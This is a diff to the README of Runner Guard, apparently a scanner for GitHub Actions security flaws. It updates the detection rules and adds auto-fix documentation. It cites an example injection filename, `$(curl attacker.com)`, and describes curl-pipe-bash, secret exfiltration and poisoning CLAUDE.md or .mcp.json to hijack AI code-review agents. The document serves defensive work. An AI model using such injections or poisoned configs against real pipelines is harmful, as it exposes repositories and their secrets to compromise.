@@ -30,11 +30,11 @@ Runner Guard detects this attack class at the byte level: invisible Unicode in w
 
 Runner Guard uses a four-stage analysis pipeline:
 
-1. **Parser** -- Reads GitHub Actions workflow YAML files and builds a structured representation of triggers, permissions, jobs, steps, expressions, and action references. Handles matrix strategies, reusable workflows, and composite actions.
+1. **Parser** -- Reads GitHub Actions workflow YAML files and builds a structured representation of triggers, permissions, jobs, steps, expressions, and action references. Handles matrix strategies, reusable workflows, composite actions, and tolerates real-world YAML edge cases (under-indented block scalars, embedded control characters, mixed line endings) that strict parsers reject.
 
 2. **Source-to-Sink Tracker** -- Identifies attacker-controlled sources (`github.event.pull_request.head.sha`, `github.head_ref`, `github.event.comment.body`, `github.event.pull_request.title`, fork-checked-out file paths) and traces them through expression interpolations, environment variables, step outputs, and file artifacts to dangerous sinks (shell `run:` blocks, action `with:` inputs, network calls).
 
-3. **Rule Engine** -- Evaluates 17 detection rules (RGS-001 through RGS-018) against the parsed workflow and source-to-sink graph. Each rule defines source patterns, sink patterns, required context conditions (trigger type, permissions, checkout target), and severity. Rules are defined in YAML for easy extension. Threat signatures (IOC patterns) are loaded from an updatable `signatures.yaml` file embedded in the binary.
+3. **Rule Engine** -- Evaluates 18 detection rules (RGS-001 through RGS-019) against the parsed workflow and source-to-sink graph. Each rule defines source patterns, sink patterns, required context conditions (trigger type, permissions, checkout target), and severity. Rules are defined in YAML for easy extension. Threat signatures (IOC patterns) are loaded from an updatable `signatures.yaml` file embedded in the binary.
 
 4. **Reporter** -- Outputs findings in multiple formats: human-readable console output with color and context, JSON for programmatic consumption, and SARIF for integration with GitHub Code Scanning, VS Code, and other SARIF-compatible tools.
 
@@ -42,7 +42,7 @@ Runner Guard uses a four-stage analysis pipeline:
 
 ## Features
 
-- **17 detection rules** covering fork checkout exploits, expression injection, secret exfiltration, unpinned actions, AI config injection, and supply chain steganography
+- **18 detection rules** covering fork checkout exploits, expression injection, secret exfiltration, unpinned actions, AI config injection, and supply chain steganography
 - **GlassWorm supply chain attack detection** -- Unicode steganography scanning, known IOC matching, and eval+decode payload pattern detection with updatable threat signatures
 - **AI config injection detection** across Claude, GitHub Copilot, Cursor, and MCP tooling -- the first scanner to cover this attack surface
 - **Source-to-sink vulnerability scanning** tracing attacker-controlled inputs through expressions, environment variables, and step outputs to dangerous sinks
@@ -50,7 +50,7 @@ Runner Guard uses a four-stage analysis pipeline:
 - **GitHub Action** -- drop-in workflow to scan every pull request in 10 lines of YAML
 - **Remote scanning** -- scan any public GitHub repo by URL without cloning
 - **Baseline management** -- suppress known findings and surface only new vulnerabilities
-- **Auto-fix** -- pin unpinned third-party actions to immutable commit SHAs
+- **Auto-fix** -- pin unpinned third-party actions to immutable commit SHAs, extract unsafe expressions from `run:` blocks into `env:` mappings with shell-aware syntax (bash, PowerShell, cmd)
 - **Inline suppression** -- silence individual findings with `# runner-guard:ignore` comments
 - **Single binary** -- zero dependencies, all rules embedded, runs anywhere Go compiles
 
@@ -167,6 +167,24 @@ runner-guard scan . --fail-on high
 
 **Rule groups:** `injection`, `permissions`, `secrets`, `supply-chain`, `ai-config`, `steganography`, `debug`
 
+### Auto-fix workflows
+
+```bash
+# Pin all unpinned third-party actions and extract unsafe expressions to env mappings
+runner-guard fix .
+
+# Dry run -- show what would be fixed without modifying files
+runner-guard fix . --dry-run
+```
+
+The fix engine:
+- **Pins actions** to immutable commit SHAs with version comments for readability
+- **Extracts Tier-1 expressions** (`github.head_ref`, `github.event.pull_request.title`, `github.event.inputs.*`, etc.) from `run:` blocks into `env:` mappings
+- **Extracts secrets** (`secrets.*`, `github.token`) from `run:` blocks into `env:` mappings
+- **Shell-aware syntax** -- uses `${VAR}` for bash, `$env:VAR` for PowerShell, `%VAR%` for cmd
+- **Handles single-quoted contexts** -- GitHub Actions expands `${{ }}` before the shell runs, so single quotes don't protect against injection. The engine uses bash string concatenation to safely extract from single-quoted strings.
+- **Skips brace expansions** -- `{1..${{ expr }}}` patterns are left alone since brace expansion happens before variable expansion in bash
+
 ### Run demo scenarios
 
 ```bash
@@ -202,25 +220,28 @@ runner-guard baseline update
 
 | ID | Name | Severity | Description |
 |----|------|----------|-------------|
-| RGS-001 | pull_request_target with Fork Checkout | Critical | Workflow checks out fork code in privileged base repo context with secret access |
-| RGS-002 | Branch Name Injection | Critical | Attacker-controlled branch name interpolated directly in shell `run:` block |
-| RGS-003 | Filename Injection | High | Attacker-controlled filename (from PR diff) interpolated in shell context |
-| RGS-004 | Comment Trigger Without Auth Check | High | `issue_comment` trigger with no `author_association` or membership verification |
+| RGS-001 | pull_request_target with Fork Code Checkout | Critical | Workflow checks out fork code in privileged base repo context with secret access |
+| RGS-002 | Expression Injection via Untrusted Input | Critical | Attacker-controlled input (branch name, PR title, comment body) interpolated directly in shell `run:` block |
+| RGS-003 | Dynamic Command Construction from Step Outputs | High | Step outputs combined with git diff/find/ls commands to construct shell commands dynamically |
+| RGS-004 | Privileged Trigger with Secrets and No Author Check | High | `issue_comment` or similar trigger with secrets access and no `author_association` or membership verification |
 | RGS-005 | Excessive Permissions on Untrusted Trigger | Medium | Write permissions granted on workflows triggered by external users |
-| RGS-006 | Curl Pipe Bash | High | Remote script fetched and piped directly to shell interpreter |
-| RGS-007 | Secret Exposed to Fork Code | High | Repository secret passed to step that executes attacker-controlled code |
-| RGS-008 | Secret in Command-Line Argument | Medium | Secret interpolated into CLI arguments, visible in process listing |
-| RGS-009 | Unpinned Third-Party Action | Medium | Action referenced by mutable tag instead of immutable commit SHA |
-| RGS-010 | AI Agent Config in Fork Checkout | High | CLAUDE.md or similar AI config loaded from fork-controlled checkout |
-| RGS-011 | MCP Config in Fork Checkout | High | .mcp.json or MCP config file read from fork-controlled checkout |
-| RGS-012 | Network Exfiltration in Privileged Context | Medium | Outbound HTTP request with secret data in privileged workflow context |
+| RGS-006 | Dangerous Sink in Run Block | High | Remote script fetched and piped directly to shell interpreter (curl pipe bash) |
+| RGS-007 | Unpinned Third-Party Action | Medium | Action referenced by mutable tag instead of immutable commit SHA |
+| RGS-008 | Secrets Exposure in Run Block | Medium | Secret or token interpolated directly in `run:` block instead of passed via `env:` mapping |
+| RGS-009 | Fork Code Execution via Build Tools | Critical | Build tools (make, npm, pip, cargo) execute attacker-controlled code from fork checkout |
+| RGS-010 | AI Agent Config Poisoning via Fork PR | High | CLAUDE.md or similar AI config loaded from fork-controlled checkout |
+| RGS-011 | MCP Config Injection via Fork Checkout | High | .mcp.json or MCP config file read from fork-controlled checkout |
+| RGS-012 | External Network Access with Secrets Context | Medium | Outbound HTTP request with secret data in privileged workflow context |
 | RGS-014 | Expression Injection via workflow_dispatch Input | High | `workflow_dispatch` input interpolated directly in shell `run:` block |
 | RGS-015 | Actions Runner Debug Logging Enabled | Medium | `ACTIONS_RUNNER_DEBUG` or `ACTIONS_STEP_DEBUG` enabled, exposing secrets in logs |
 | RGS-016 | Unicode Steganography in Workflow File | Critical | Invisible Unicode characters detected in workflow YAML -- active compromise indicator |
 | RGS-017 | Unicode Steganography in Referenced Script | High | Invisible Unicode in files executed by the workflow (setup.py, package.json, etc.) |
 | RGS-018 | Suspicious Payload Execution Pattern | High | Eval+decode chains, known malware IOCs, or C2 patterns in workflow `run:` blocks |
+| RGS-019 | Step Output Interpolated in run Block | Medium | `steps.*.outputs.*` expression interpolated directly in `run:` block -- may carry attacker-controlled data via PR filenames or user input |
 
 **RGS-010** and **RGS-011** are unique to Runner Guard. No other CI/CD security scanner detects AI configuration injection attacks where an attacker modifies CLAUDE.md, .claude/settings.json, .mcp.json, or mcp-config.json in a fork pull request to hijack AI code review agents running in privileged CI contexts.
+
+**RGS-019** detects step outputs (`${{ steps.*.outputs.* }}`) interpolated directly in `run:` blocks. Step outputs may carry attacker-controlled data -- for example, a step that runs `git diff --name-only` on a pull request produces filenames that an attacker controls. When those filenames flow through `$GITHUB_OUTPUT` into a step output and are interpolated directly into a shell script, an attacker can craft filenames like `$(curl attacker.com)` to achieve command injection. This rule flags all step output interpolations for manual review, as not all step outputs are dangerous -- the risk depends on what the producing step does.
 
 **RGS-016**, **RGS-017**, and **RGS-018** detect the GlassWorm supply chain attack and related steganographic techniques. RGS-016 performs byte-level scanning of workflow files for invisible Unicode characters (variation selectors, zero-width chars, tag characters) used to encode hidden payloads. RGS-017 extends this analysis to files referenced and executed by workflows (setup.py, package.json, Dockerfiles, shell scripts). RGS-018 matches known IOC patterns from the GlassWorm campaign and detects dangerous eval+decode execution patterns. Threat signatures are loaded from an embedded `signatures.yaml` that can be updated without code changes.
 
